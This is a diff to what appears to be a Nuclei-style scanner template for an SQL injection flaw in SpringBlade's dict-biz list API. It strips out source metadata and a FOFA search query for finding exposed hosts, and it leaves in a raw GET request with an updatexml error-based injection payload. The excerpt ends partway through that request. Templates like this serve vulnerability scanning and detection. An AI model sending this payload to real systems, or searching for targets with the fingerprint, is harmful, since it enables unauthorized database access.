@@ -3,12 +3,8 @@ info:
   name: SpringBlade dict-biz list SQL 注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cvhgmvqfleem6s9d'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cvhgmvqfleem6s9d
-    fofa: body="Saber 将不能正常工作"
 http:
 - raw:
   - 'GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1)=1 HTTP/1.1
